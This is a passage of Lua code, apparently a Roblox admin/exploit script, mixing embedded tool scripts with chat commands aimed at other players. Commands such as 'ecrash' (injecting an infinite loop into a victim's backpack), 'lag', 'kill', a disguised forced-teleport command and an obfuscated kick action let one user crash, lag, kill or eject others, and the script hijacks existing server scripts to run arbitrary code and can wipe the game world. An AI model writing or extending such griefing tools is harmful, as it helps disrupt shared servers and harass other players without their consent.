mesh.Scale = Vector3.new(0.55,0.55,0.75)
mesh.VertexColor = Vector3.new(0,2,2)
tab[i] = s
end
jointz.C0 = CFrame.new(1.5,0.5,0) * CFrame.Angles(0,0,0)
Summon.Pitch = summonpitch
Summon.Volume = summonvol
effectz = true
Summon:Play()
for i = 1, 22 do
Summon.Pitch = Summon.Pitch - (1/22)
for i, v in pairs(tab) do
v.CFrame = v.CFrame * CFrame.new(0,0,9/22) * CFrame.Angles(0,0,math.pi*6/22)
v.Transparency = v.Transparency - 0.65/22
end
jointz.C0 = jointz.C0 * CFrame.Angles(math.pi/1.6/22,0,0) * CFrame.Angles(0,0,0.08)
wait(0.012)
end
wait(0.12)
Summon:Stop()
Summon.Pitch = summonpitch
Summon.Volume = summonvol
for i = 1, 9 do
jointz.C0 = jointz.C0 * CFrame.Angles(0,-math.pi/2/3,0)
wait()
end
for i, v in pairs(tab) do
v.CFrame = CFrame.new(v.Position, mouse.Hit.p) * CFrame.Angles(0,math.pi,0)
end
for i = 1, 9 do
jointz.C0 = jointz.C0 * CFrame.Angles(-math.pi/1.4/5,0.06,0)
if i == 9 then
for ii = 1, 9 do
table.insert(raytable, tab[ii])
game:service("Debris"):AddItem(tab[ii], 8.5)
tab[ii] = nil
end
end
wait()
end
effectz = false
HUM.WalkSpeed = 16
bp:Destroy()
bg:Destroy()
wait(0.45)
Casting = false
jointz.C0 = CFrame.new(1.5,0.5,0) * CFrame.Angles(math.pi/2.4,0,0)
end
function Teleport(mouse)
Instance.new("ForceField", char)
local posz = mouse.Hit.p
local bp = Instance.new("BodyPosition", Torsoz)
bp.maxForce = Vector3.new(math.huge,math.huge,math.huge)
bp.position = Torsoz.Position
local bg = Instance.new("BodyGyro", Torsoz)
bg.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
bg.cframe = CFrame.new(Torsoz.Position, Vector3.new(mouse.Hit.x,Torsoz.Position.y,mouse.Hit.z))
HUM.WalkSpeed = 0
local jointz = Joint1
jointz.C0 = CFrame.new(1.5,0.5,0) * CFrame.Angles(0,0,0)
Casting = true
effectz = true
Torsoz.CFrame = CFrame.new(Torsoz.Position, Vector3.new(mouse.Hit.x,Torsoz.Position.y,mouse.Hit.z))
local por = P:Clone()
por.Parent = Torsoz
por.Anchored = true
por.CFrame = Torsoz.CFrame + Torsoz.CFrame.lookVector*3.5
por.BrickColor = BrickColor.new("White")
por.Transparency = 0.5
por.Reflectance = 1
local mesh = Instance.new("SpecialMesh", por)
mesh.MeshType = "Sphere"
mesh.Scale = Vector3.new(0,0,0)
local mar = P:Clone()
mar.Parent = Torsoz
mar.Anchored = true
mar.CFrame = CFrame.new(posz)
mar.BrickColor = BrickColor.new("Navy blue")
mar.Transparency = 1
mar.Reflectance = 1
local mesh = Instance.new("SpecialMesh", mar)
mesh.Scale = Vector3.new(0,3,0)
mesh.MeshType = "Brick"
mesh.MeshId = "http://www.roblox.com/asset/?id=20329976"
for i = 1, 22 do
por.Transparency = por.Transparency - (0.7/22)
por.Reflectance = por.Reflectance - (0.9/22)
por.Mesh.Scale = por.Mesh.Scale + Vector3.new(16/22,19/22,0.6/22)
jointz.C0 = jointz.C0 * CFrame.Angles(math.pi/1.6/22,0,0) * CFrame.Angles(0,0,0.08)
wait(0.012)
end
for i = 1, 10 do
mar.Transparency = mar.Transparency - (0.7/10)
mar.Reflectance = mar.Reflectance - (0.9/10)
mar.Mesh.Scale = mar.Mesh.Scale + Vector3.new(3/10,0,3/10)
jointz.C0 = jointz.C0 * CFrame.Angles(0,-math.pi*2/10,0)
wait()
end
HUM.WalkSpeed = 16
bp:Destroy()
bg:Destroy()
Torsoz.CFrame = CFrame.new(posz, Torsoz.CFrame.p) * CFrame.Angles(0,math.pi,0) + Vector3.new(0,3.5,0)
for i = 1, 11 do
por.Transparency = por.Transparency + (0.7/11)
por.Reflectance = por.Reflectance + (0.9/11)
por.Mesh.Scale = por.Mesh.Scale - Vector3.new(16/11,19/11,0.6/11)
mar.Transparency = mar.Transparency + (0.7/11)
mar.Reflectance = mar.Reflectance + (0.9/11)
mar.Mesh.Scale = mar.Mesh.Scale - Vector3.new(3/11,2/11,3/11)
jointz.C0 = jointz.C0 * CFrame.Angles(-(math.pi/1.6)/11,0,0) * CFrame.Angles(0,0,-0.16)
wait()
end
por:Destroy()
mar:Destroy()
effectz = false
wait(0.15)
Casting = false
jointz.C0 = CFrame.new(1.5,0.5,0) * CFrame.Angles(math.pi/2.4,0,0)
char.ForceField:Remove()
end
function Blade()
        if DoubleSword == true then
                DoubleSword = false
        if DoubleSword == false then
                DoubleSword = true
                end
        end
end
function onKeyDown(key, mouse)
if Charging == false and Attacking == false and Casting == false then
if key == "q" then
SwordThrow(mouse)
elseif key == "r" then
Teleport(mouse)
elseif key == "e" then
Blade()
end
end
end
function Equip()
effectz = true
Attacking = true
Charging = true
local p = P:Clone()
p.Parent = Torsoz
p.Transparency = 1
local w = Instance.new("Motor", p)
w.Part0 = p
w.Part1 = RA
w.C0 = CFrame.new(0,-0.5,0)
RS.Part0 = nil
Joint1 = Instance.new("Motor", p)
Joint1.Part0 = Torsoz
Joint1.Part1 = p
Joint1.C0 = CFrame.new(1.5,0.5,0)
for i = 1, 8 do
Joint1.C0 = Joint1.C0 * CFrame.Angles(math.pi*1.2/8,-0.4/8,0)
wait()
end
Main.Part0 = RA
Main.C0 = CFrame.new(0,-1,-1.5) * CFrame.Angles(0,math.pi,math.pi/2)
for i = 1, 9 do
Joint1.C0 = Joint1.C0 * CFrame.Angles(-math.pi*1.2/14,0,0)
wait()
end
Main.Part0 = RA
Main.C0 = CFrame.new(0,-1,-1.5) * CFrame.Angles(0,math.pi,math.pi/2)
Joint1.C0 = CFrame.new(1.5,0.5,0) * CFrame.Angles(math.pi/2.4,0,0)
Attacking = false
Charging = false
effectz = false
end
function UnEquip()
effectz = true
local joint = Joint1
Joint1.C0 = CFrame.new(1.5,0.5,0) * CFrame.Angles(math.pi/2.4,0,0)
for i = 1, 9 do
Joint1.C0 = Joint1.C0 * CFrame.Angles(math.pi*1.2/14,0,0)
wait()
end
Main.Part0 = Torsoz
Main.C0 = CFrame.new(0,0,0.55) * CFrame.Angles(math.pi/2,0,math.pi)
Main.C0 = Main.C0 * CFrame.Angles(0,math.pi/4,0)
for i = 1, 8 do
Joint1.C0 = Joint1.C0 * CFrame.Angles(-math.pi*1.2/8,0,0)
wait()
end
joint.Parent:remove()
RS.Part0 = Torsoz
RS.Part1 = RA
effectz = false
end
bin.Selected:connect(function(mouse)
mouse.Icon = "rbxasset://textures\\GunCursor.png"
mouse.Button1Down:connect(function() onButton1Down(mouse) end)
mouse.KeyDown:connect(function(key) onKeyDown(key, mouse) end)
Equip()
end)
bin.Deselected:connect(function()
UnEquip()
Build()
end)
wait(1)
local plus = true
local DDD = 1
coroutine.resume(coroutine.create(function()
while true do
DDD = DDD + 1
if DDD%1 == 0 then
if effectz == true then
if Main.Parent ~= nil then
local gg = P:Clone()
gg.Name = "SwordEffect"
gg.Parent = Torsoz
gg.Anchored = true
gg.Size = Vector3.new(0.5,0.5,0.5)
gg.CFrame = Main.Parent.CFrame
local mesh = Instance.new("SpecialMesh", gg)
mesh.MeshId = "http://www.roblox.com/asset/?id=74908699"
mesh.TextureId = "http://www.roblox.com/asset/?id=74908713"
mesh.Scale = Vector3.new(0.75,0.75,0.75)
table.insert(efftable, gg)
if doublesword == true then
local gg2 = P:Clone()
gg2.Name = "SwordEffect2"
gg2.Parent = Torsoz
gg2.Anchored = true
gg2.Size = Vector3.new(0.5,0.5,0.5)
gg2.CFrame = gg.CFrame * CFrame.new(0,0,-3.25) * CFrame.Angles(0,math.pi,0)
local mesh = Instance.new("SpecialMesh", gg2)
mesh.MeshId = "http://www.roblox.com/asset/?id=74908699"
mesh.TextureId = "http://www.roblox.com/asset/?id=74908713"
mesh.Scale = Vector3.new(0.75,0.75,0.75)
table.insert(efftable, gg2)
end
end
end
end
for i, v in pairs(efftable) do
if v.Transparency > 0.9 then
efftable[i]:remove()
efftable[i] = nil
end
v.Transparency = v.Transparency + 0.055
end
if j ~= nil then
if j.Transparency > 0.96 then
plus = false
j.Transparency = 0.25
j.Mesh.Scale = Vector3.new(0.75,0.75,0.75)
j.Mesh.VertexColor = Vector3.new(1,1,1)
if j2 ~= nil then
j2.Transparency = 0.25
j2.Mesh.Scale = Vector3.new(0.75,0.75,0.75)
j2.Mesh.VertexColor = Vector3.new(1,1,1)
end
Spawn(function() wait(0.5) plus = true end)
end
if plus == true then
j.Transparency = j.Transparency + 0.045
j.Mesh.Scale = j.Mesh.Scale + Vector3.new(0.022*2,0.028*2,0.004*2)
j.Mesh.VertexColor = j.Mesh.VertexColor - Vector3.new(0.1,0.04,0)
if j2 ~= nil then
j2.Transparency = j2.Transparency + 0.045
j2.Mesh.Scale = j2.Mesh.Scale + Vector3.new(0.022*2,0.028*2,0.004*2)
j2.Mesh.VertexColor = j2.Mesh.VertexColor - Vector3.new(0.1,0.04,0)
end
end
end
 
for i, v in pairs(raytable) do
if v ~= nil and v.className == "Part" then
local posz1 = v.CFrame * CFrame.new(0,0,-2.25)
local ray = Ray.new(posz1.p, posz1.lookVector*-4.5)
local hitz, enz = workspace:FindPartOnRay(ray, char)
if hitz ~= nil then
x = Instance.new("Explosion", workspace)
x.Position = enz
raytable[i]:remove()
raytable[i] = nil
end
v.CFrame = v.CFrame - v.CFrame.lookVector*4.5
end
end
wait()
end
end))
]]
 
 
 
 
 
 
PixelChatSource = [[
wait(0.001)
script:ClearAllChildren();
script.Parent=nil;
wait(1)
LocalPlayer = game:service'Players'.LocalPlayer
Letters = {"00000000000000000000000000000000000","01000010000100001000010000000001000","10100101000000000000000000000000000","00000010101111101010111110101000000","00100111111010011111001011111100100","00000000001100111010001000101110011","00100010100101001010011011001001101","00100001000000000000000000000000000","00010001000100001000010000010000010","01000001000001000010000100010001000","00100011100010000000000000000000000","00000001000010011111001000010000000","00000000000000000000110001100001000","00000000000000000000011100000000000","00000000000000000000000001100011000","00000000100001000100001000100001000","01110100011001110101110011000101110","00100011000010000100001000010011111","01110100010000100110010001000111111","01110100010000100110000011000101110","00011001010100110001111110000100001","11111100001111000001000011000101110","00110010001000011110100011000101110","11111100010000100010001000010000100","01110100011000101110100011000101110","01110100011000101111000010001001100","00000000000110001100000000110001100","00000011000110000000011000110000100","00010001000100010000010000010000010","00000000001111100000111110000000000","01000001000001000001000100010001000","01110100010000100010001000000000100","01110100011011110101101111000001111","01110100011111110001100011000110001","11110100011111010001100011000111110","01110100011000010000100001000101110","11110100011000110001100011000111110","11111100001110010000100001000011111","11111100001110010000100001000010000","01111100001001110001100011000101110","10001100011111110001100011000110001","01110001000010000100001000010001110","00001000010000100001000011000101110","10010101001100011000101001001010010","10000100001000010000100001000011111","10001110111010110001100011000110001","10001110011010110011100011000110001","01110100011000110001100011000101110","11110100011111010000101001000010000","01110100011000110001100011001001101","11110100011111010001100011000110001","01111100000111000001000011000101110","11111001000010000100001000010000100","10001100011000110001100011000101110","10001100011000110001010100101000100","10001100011000110001101011101110001","10001010100010001010100011000110001","10001010100010000100001000010000100","11111000010001000100010001000011111","01110010000100001000010000100001110","00000010000100000100001000001000010","01110000100001000010000100001001110","00000001000101000000000000000000000","00000000000000000000000000000011111","01000001000000000000000000000000000","00000000000111000001011111000101111","10000100001011011001100011000111110","00000000000111010001100001000101110","00001000010110110011100011000101111","00000000000111010001111111000001111","00011001000111100100001000010000100","00000000000111110001011110000111110","10000100001011011001100011000110001","00100000000010000100001000010000100","00001000000000100001100011000101110","10000100001001010100110001010010010","00100001000010000100001000010000010","00000000001101010101101011000110001","00000000001111010001100011000110001","00000000000111010001100011000101110","00000000001011011001111101000010000","00000000000110110011011110000100001","00000000001011011001100001000010000","00000000000111110000011100000111110","00100001000111000100001000010000010","00000000001000110001100011000101111","00000000001000110001100010101000100","00000000001000110001101011010101111","00000000001000101010001000101010001","00000000001000110001011110000111110","00000000001111100010001000100011111","00010001000010001000001000010000010","10000100001000010000100001000010000","01000001000010000010001000010001000","00000000000000000010101010100000000"}
DeModel = Instance.new("BillboardGui", workspace:findFirstChild(LocalPlayer.Name))
DeModel.StudsOffset = Vector3.new(0,2.5,0)
DeModel.Name = ":D"
FR = Instance.new("Frame",DeModel)
FR.Size=UDim2.new(1,0,1,0)
FR.BackgroundColor3=BrickColor.new("Institutional white").Color
FR.BorderSizePixel=0
FR.ZIndex=2
CurrParent = workspace:findFirstChild(LocalPlayer.Name).Head
game:service'RunService'.RenderStepped:connect(function()
        pcall(function()
                local a = workspace:findFirstChild(LocalPlayer.Name)
                if a.ClassName == 'Part' then
                        CurrParent = a
                else
                        CurrParent = a:findFirstChild'Head'
                end
        end)
        if DeModel.Parent ~= CurrParent or DeModel == nil or FR.Parent ~= DeModel or FR == nil then
                pcall(function()
                        if CurrParent.ClassName == 'Part' then
                                DeModel = Instance.new("BillboardGui", CurrParent)
                                DeModel.Adornee = CurrParent
                                DeModel.StudsOffset = Vector3.new(0,2.5,0)
                                DeModel.Name = ":D"
                                FR = Instance.new("Frame",DeModel)
                                FR.Size=UDim2.new(1,0,1,0)
                                FR.BackgroundColor3=BrickColor.new("Institutional white").Color
                                FR.BorderSizePixel=0
                                FR.ZIndex=2
                        end
                end)
        end
end)
function CreateLetter(what, pos, posy, cl)
        pcall(function()
                if cl == nil then cl = "Really black" end
                if Letters[what:byte()-31] then
                        what = Letters[what:byte()-31]
                else
                        what = Letters[1]
                end
                if type(what) ~= "string" then return end
                what = what:gsub('\n','')
                what = what:gsub('\t','')
                what = what:gsub(' ','')
                pos = pos * 2
                posy = posy * 2
                c =  0
                for y=1,7 do
                        for x=1,5 do
                                c = c + 1
                                if what:sub(c, c) == "1" then
                                        local a = Instance.new("Frame", FR)
                                        a.Name = "L"
                                        a.ZIndex=3
                                        a.Size = UDim2.new(0,2,0,2)
                                        a.BorderSizePixel = 0
                                        a.BackgroundTransparency = 1
                                        a.BackgroundColor3 = BrickColor.new(cl).Color
                                        a.Position = UDim2.new(0,((x+1)*2)+pos,0,(y*2)+posy)
                                        coroutine.wrap(function()
                                                wait(math.random(1, 10)/50)
                                                a.BackgroundTransparency = 0
                                        end)()
                                end
                        end
                end
        end)
end
LocalPlayer.Chatted:connect(function(m)
        pcall(function()
                local cl = "Really black"
                for _,v in pairs(DeModel.Frame:children()) do
                        v:Destroy()
                end
                if m:sub(1,2) == '/e' then return end
                if m:sub(1,3) == "/! " then
                        m = m:sub(4)
                        DeModel.Frame.BackgroundColor3 = BrickColor.new("Really black").Color
                        cl = "Really red"
                else
                        DeModel.Frame.BackgroundColor3 = BrickColor.new("Institutional white").Color
                end
                m1 = m:gsub("\n"," ")
                m1 = m1:gsub("\t"," ")
                m1 = m1:gsub("math.pi",tostring(math.pi))
                if #m1 <= 30 then
                        DeModel.Size = UDim2.new(0,(30+(#m1*10)),0,20)
                elseif #m1 <= 60 then
                        DeModel.Size = UDim2.new(0,330,0,40)
                elseif #m1 <= 90 then
                        DeModel.Size = UDim2.new(0,330,0,60)
                elseif #m1 > 90 then
                        DeModel.Size = UDim2.new(0,340,0,60)
                        m1 = m1:sub(1,90).."..."
                end
                coroutine.wrap(function()
                        for i = 1,0,-1/#m1 do
                                DeModel.Frame.Transparency = i
                                wait(1/60)
                        end
                end)()
                if #m1 < 30 then
                        for i = 1,#m1 do
                                CreateLetter(m1:sub(i,i),i*5,0,cl)
                                wait(1/60)
                        end
                elseif #m1 <= 60 then
                        for i = 1,30 do
                                CreateLetter(m1:sub(i,i),i*5,0,cl)
                                wait(1/60)
                        end
                        for i = 31,#m1 do
                                CreateLetter(m1:sub(i,i),(i-30)*5,10,cl)
                                wait(1/60)
                        end
                elseif #m1 >= 60 then
                        for i = 1,30 do
                                CreateLetter(m1:sub(i,i),i*5,0,cl)
                                wait(1/60)
                        end
                        for i = 31,60 do
                                CreateLetter(m1:sub(i,i),(i-30)*5,10,cl)
                                wait(1/60)
                        end
                        for i = 61,#m1 do
                                CreateLetter(m1:sub(i,i),(i-60)*5,20,cl)
                                wait(1/60)
                        end
                end
        end)
end)
]]
 
 
 
 
Raven = [[
        local fp = Instance.new("Part", game:GetService("Players").LocalPlayer.Character)
fp.Anchored = true
fp.Size = Vector3.new(10, 3, 25)
game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 32
 
local players = {}
 
local fpm = Instance.new("SpecialMesh", fp)
fpm.MeshId = "http://www.roblox.com/asset/?id=20925363"
fpm.TextureId = "http://www.roblox.com/asset/?id=20925361"
fpm.Scale = Vector3.new(10, 10, 10)
fpm.VertexColor = Vector3.new(1, 0, 0)
 
fp.Touched:connect(function(part)
        pcall(function()
                table.insert(players, part.Parent:findFirstChild("Torso"))
                part.Parent:findFirstChild("Torso").Anchored = true
                                part.Parent:findFirstChild("Humanoid").WalkSpeed = 0
        end)
end)
 
while wait() do
        fp.CFrame = CFrame.new(game:GetService("Players").LocalPlayer.Character.Torso.CFrame.x, game:GetService("Players").LocalPlayer.Character.Torso.CFrame.y - 5, game:GetService("Players").LocalPlayer.Character.Torso.CFrame.z) * CFrame.Angles(game:GetService("Players").LocalPlayer.Character.Torso.CFrame:toEulerAnglesXYZ())
        fp.Position = fp.CFrame.p
        for i, v in pairs(players) do
                v.CFrame = fp.CFrame * CFrame.new(0, 3, 2)
        end
end ]]
 
 
 
 
 
coroutine.resume(coroutine.create(function()
while wait(3) do
if game:GetService("Players").Name ~= "Players" then
game:GetService("Players").Name = "Players"
end
end
end))
 
function Dismiss()
for i = 1, 10 do
for i = 1, #Tabs do
table.remove(Tabs, i)
if tabmodel then
tabmodel:ClearAllChildren()
end end end
end
 
function AddCmd(Name,Say,Desc,Func)
table.insert(Cmds,{["Name"] = Name,["Say"] = Say,["Desc"] = Desc,["Func"] = Func})
end
 
 
 
 
AddCmd("Make a player high","weed","Makes a player see rainbowz",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS(FunScript, plr.Backpack)
end
end
end
)
 
 
AddCmd("Idk, testin agen","testy","agen",
        function(plrs)
                for _, plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                NewLS(Raven, plr.Backpack)
                        end
                end
        end
)
 
AddCmd("Give pixelchat to your-self","pc","pc",
        function(plrs)
                for _, plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                NewLS(PixelChatSource, plr.Backpack)
                        end
                end
        end
)
 
 
AddCmd("Testing","test","testing",
function(plrs)
        for _, plr in pairs(plrs) do
                if plr and plr.Backpack then
                        NewLS(Test, plr.Backpack)
                end
        end
end
)
 
 
 
 
 
AddCmd("Make your-self a wizard","wiz","Makes your self a wizard don't ask why i added dis plz",--Credit to Z7M, for the idea c: dankz budy :)
        function(plrs)
                for _, plr in pairs (plrs) do
                        if plr and plr.Backpack then
                                NewLS(Wizard, plr.Backpack)
                        end
                end
        end
)
 
AddCmd("Give your self shoop","shoop","well it guv udsehohop",
        function(plrs)
                for _, plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                NewLS(Shoop, plr.Backpack)
                        end
                end
        end
)
 
 
 
 
AddCmd("Give your-self soulcrusher or something XD","soul","well look at de commnd mmk",
        function(plrs)
                for _, plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                NewLS(SoulCrushingKarate, plr.Backpack)
                        end
                end
        end
       
)
 
AddCmd("Give your-self spikes","spike","Makes you have spikes xD",
        function(plrs)
                for _, plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                NewLS(Spikes, plr.Backpack)
                        end
                end
        end
)
 
AddCmd("Give your-self a knife","knife","Gives your-self or others a knife",
        function(plrs)
                for _, plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                NewLS(Knife, plr.Backpack)
                        end
                end
        end
)
 
AddCmd("Give your-self a warhammah","warham","Gives your self a warhammer",
        function(plrs)
                for _, plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                NewLS(WarHammer, plr.Backpack)
                        end
                end
        end
)
 
 
 
AddCmd("Make your self a minipeep","mp","Makes your self a minipeep",
        function(plrs)
                for _, plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                NewLS(MiniPeep, plr.Backpack)
                                       
                        end
                        end
                end
)
 
 
AddCmd("Give your self technogauntlets","techno","Gives someone Technogauntlets",
        function(plrs)
                for _, plr in pairs(plrs) do
                        if plr and plr.Backpack then
                                NewLS(TechnoGauntlets, plr.Backpack)
                        end
                end
        end
)
 
 
AddCmd("Kill a player","kill","Kill a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
plr.Character:BreakJoints()
end
end
end
)
 
AddCmd("Easy-crash","ecrash","Easy-crash a player",
        function(Plrs)
                for _,plr in pairs(Plrs) do
                        if plr and plr.Backpack then
                                NewLS("repeat until false",plr.Backpack)
                        end
                end
        end
)
 
 
 
AddCmd("Lag dat mofo c:","lag","Lag a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS(LagSource, plr.Backpack)
end
end
end
)
 
 
 
 
 
 
 
found = false
 
coroutine.wrap(function()
while found == false do
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then break end
for _,scriptinworkspace in pairs(workspace:children()) do
if scriptinworkspace then
if scriptinworkspace:IsA("Script") then
if scriptinworkspace:FindFirstChild(SourceName) then
newScript = scriptinworkspace:Clone()
wait(0.2)
newScript.Name = "NewScript"
newScript.Disabled = true
newScript:FindFirstChild(SourceName).Value = ""
Output("Aye, look you found a source C:", __)
found = true
break
end
end
end
end
wait()
end
end)()
 
 
 
function NewS(sourcevalue, parent)
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then
NS(sourcevalue, parent)
else
if newScript then
local scr = newScript:Clone()
if scr:FindFirstChild(SourceName) then
if scr:FindFirstChild(SourceName) then
scr:FindFirstChild(SourceName).Value = sourcevalue
scr.Parent = parent
wait(0.5)
scr.Disabled = false
return scr
end
end
end
end
end
 
sorcery = script:Clone()
 
Services = {
game:GetService("Workspace"),
game:GetService("Players"),
game:GetService("Lighting"),
game:GetService("StarterPack"),
game:GetService("StarterGui"),
game:GetService("Teams"),
game:GetService("SoundService"),
game:GetService("Debris"),
game:GetService("InsertService"),
game:GetService("RunService"),
game:GetService("Chat"),
game:GetService("TeleportService"),
game:GetService("Geometry"),
game:GetService("MarketplaceService"),
game:GetService("BadgeService"),
game:GetService("NetworkClient"),
game:GetService("FriendService"),
}
 
function Explore(Item)
Dismiss()
if(Item==nil)then
for _,v in pairs(Services)do
Output(v.Name,function() Explore(v) end)
end;
else
f={
['View children']=function()
Dismiss()
for _,v in pairs(Item:children())do
Output(v.Name,function()
Explore(v)
wait()
end);
end;
end;
['View parent']=function()
Explore(Item.Parent)
end;
['Destroy']=function()
Item:Destroy();
Explore(Item.Parent);
end;
['Clear']=function()
Item:ClearAllChildren()
end;
['Clone']=function()
pcall(function()
cloneableObj = Item:clone()
end)
end;
['Remove']=function()
Item:remove()
end;
['Paste']=function()
if cloneableObj then
cloneableObj.Parent = Item
end
end;
['Ki'..'ck Item']=function()
NewLS("local plr = game:service'Players'.LocalPlayer; plr:Ki".."ck()", Item)
end;
};
for i,v in pairs(f)do
Output(tostring(i),v);
end;
Output('Item Name: \''..tostring(Item.Name)..'\'',nil);
Output('Class: \''..tostring(Item.ClassName)..'\'',nil);
if cloneableObj then
Output('Currently Cloning: \''..tostring(cloneableObj.Name)..'\'',nil);
end
end;
end;
 
AddCmd("Explore","explore","Explore the game",
function()
Explore()
end
)
 
function NewLS(sourcevalue, parent)
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then
NLS(sourcevalue, parent)
else
local NS = sorcery:Clone()
NS.Name = "NewLocal"
local Source = NS:findFirstChild(SourceName)
if Source == nil then Instance.new('StringValue',NS).Name = SourceName end Source = NS:findFirstChild(SourceName)
Source.Value = sourcevalue
NS.Parent = parent
NS.Disabled = false
return NS
end
end
 
Clothes = {}
 
for _,Item in pairs(LocalPlayer.Character:GetChildren()) do
if Item:IsA('CharacterMesh') or Item:IsA('Hat') or Item:IsA('Shirt') or Item:IsA('Pants') then
table.insert(Clothes,Item:Clone())
end
end
for i,v in pairs(LocalPlayer.Character:GetChildren()) do
if v:IsA("BodyColors") then
body = v
torsocolor = body.TorsoColor
leftlegcolor = body.LeftLegColor
rightlegcolor = body.RightLegColor
leftarmcolor = body.LeftArmColor
rightarmcolor = body.RightArmColor
headcolor = body.HeadColor
end
end
 
mouse = LocalPlayer:GetMouse()
 
mouse.KeyDown:connect(function(key)
if key == "z" then
game:service'StarterGui':SetCoreGuiEnabled(4, true)
end
end)
 
 
 
AddCmd("Set WalkSpeed","ws","Set the walkspeed of player",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local speed = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v.Character ~= nil and v.Character:findFirstChild("Humanoid") ~= nil then
v.Character:findFirstChild("Humanoid").WalkSpeed = speed
end
end
end
)
 
AddCmd("For someone... ;)","tp","Lol, you'll find out soon or later right?:)",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local id = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v and v.Backpack then
NewLS([[game:service'TeleportService':Teleport(]]..id..[[)]], v.Backpack)
end
end
end
)
 
 
AddCmd("Nil players","nilp","Check nil players",
        function()
                NewS([[
                        local mod = Instance.new("Model")
                        mod.Name = "NilPlayers"
                        pcall(function()
                                for k,v in pairs(game:GetService("NetworkServer"):GetChildren()) do
                                        pcall(function()
                                                local p = v:GetPlayer()
                                                if p.Parent ~= game.Players then
                                                        local a = Instance.new("StringValue", mod)
                                                        a.Value = "NIL: "..p.Name
                                                else
                                                        local a = Instance.new("StringValue", mod)
                                                        a.Value = p.Name
                                                end
                                        end)
                                end
                        end)
                        mod.Parent = game:GetService("Lighting")
                        script:Destroy()
                ]], game.Workspace)
                local np = false
                for i=1,5,0.1 do
                        np = game:GetService("Lighting"):findFirstChild("NilPlayers")
                        if np then break end
                        wait(0.1)
                end
                if not np then
                        return Output("Something went wrong! F\5U\5C\5K!","Really red")
                end
                for k,v in pairs(np:GetChildren()) do
                        if v:IsA("StringValue") then
                                if v.Value:lower():sub(1,4) == "nil:" then
                                        Output(v.Value,"Really red")
                                else
                                        Output(v.Value)
                                end
                        end
                end
                wait()
                np:Destroy()
        end
)
 
 
AddCmd("Available","askme","Tell people they can ask you scripting-questions",
        function()
                for i = 0,6,1 do
                        Output("Available for scripting-questions!","Lime green")
                end
        end
)
 
 
 
 
 
 
 
Bad_Char = ""
 
function chatgui(msg)
if not chatgui then return end
if probemode == false then
if LocalPlayer.Character:findFirstChild("Head") then
mainPart = LocalPlayer.Character:findFirstChild("Head")
end
end
if probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
mainPart = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe")
end
end
local bg = Instance.new("BillboardGui", mainPart)
bg.Adornee = mainPart
bg.Name = "CHATGUIBG"
bg.Size = UDim2.new(4, 0, 2.5, 0)
bg.StudsOffset = Vector3.new(-4, 2, 0)
local bg2 = Instance.new("BillboardGui", mainPart)
bg2.Adornee = mainPart
bg2.Name = "CHATGUIBG2"
bg2.Size = UDim2.new(4, 0, 2.5, 0)
bg2.StudsOffset = Vector3.new(-4, 4.5, 0)
local text = Instance.new("TextLabel", bg)
text.Size = UDim2.new(3, 0, 0.5, 0)
text.FontSize = "Size18"
text.TextScaled = true
text.TextTransparency = 0
text.BackgroundTransparency = 1
text.TextTransparency = 0
text.TextStrokeTransparency = 0
text.Font = "Arial"
text.TextColor3 = Color3.new(0, 255, 255)
text.Text = " "
Message = msg:gsub("","\5")
if #Message >50 then return end
for i = 0, #Message, 1 do
wait(0.01)
text.Text = string.gsub("|"..LocalPlayer.Name.."| "..Message:gsub(0, i),'fuck','fuck')
end
wait()
coroutine.resume(coroutine.create(function()
for i = 0, 5, 0.05 do
if bg ~= nil then
if bg2 ~= nil then
wait()
bg2.StudsOffset = bg2.StudsOffset + Vector3.new(0, 0.05, 0)
end
bg.StudsOffset = bg.StudsOffset + Vector3.new(0, 0.05, 0)
end
end
end))
for i=text.TextTransparency,1,0.02 do
wait()
text.TextTransparency = i
text.TextStrokeTransparency = i
end
if bg == nil then return end
bg:Destroy()
if bg2 == nil then return end
bg2:Destroy()
end
 
LocalPlayer.Chatted:connect(chatgui)
 
 
 
 
AddCmd("Clean the game","clean","Fully clean the game",
    function()
                for i,s in pairs(workspace:GetChildren()) do  
if game:GetService("Players"):GetPlayerFromCharacter(s) == nil then  
if s.className ~= "Terrain" then
if s.className ~= "Camera" then  
pcall(function() s:Destroy() end)
end end end end
local b = Instance.new("Part", Game:GetService("Workspace"))
b.Size = Vector3.new(3000, 1, 3000)
b.CFrame = CFrame.new(0, 0, 0)
b.Name = "Base"
b.BrickColor = BrickColor.new("Earth green")
b.TopSurface = "Smooth"
b.BottomSurface = "Smooth"
b.LeftSurface = "Smooth"
b.RightSurface = "Smooth"
b.FrontSurface = "Smooth"
b.BackSurface = "Smooth"
b.Anchored = true
b.Locked = true
local sl = Instance.new("SpawnLocation", workspace)
sl.Anchored = true
sl.Locked = true
sl.formFactor = "Plate"
sl.Size = Vector3.new(6, 0.4, 6)
sl.CFrame = CFrame.new(0, 0.6, 0)
sl.BrickColor = BrickColor.new("Really red")
sl.TopSurface = "Smooth"
sl.BottomSurface = "Smooth"
sl.LeftSurface = "Smooth"
sl.RightSurface = "Smooth"
sl.FrontSurface = "Smooth"
sl.BackSurface = "Smooth"
game.Lighting.FogEnd = 10011111111
